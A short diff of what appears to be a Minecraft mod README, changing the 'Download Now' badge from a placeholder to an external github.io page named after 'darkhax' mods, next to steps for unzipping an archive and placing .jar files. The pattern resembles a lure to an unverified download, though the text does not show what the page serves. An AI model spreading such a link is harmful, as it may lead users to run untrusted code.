@@ -10,7 +10,7 @@ Unzip the archive to a separate folder.
 
 Place the `.jar` files into your Minecraft `mods` folder.
 
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://darkhax-mods-minecraft.github.io/.github/)
 
 ## 📸 Overview
 A quick look at key parts in action:
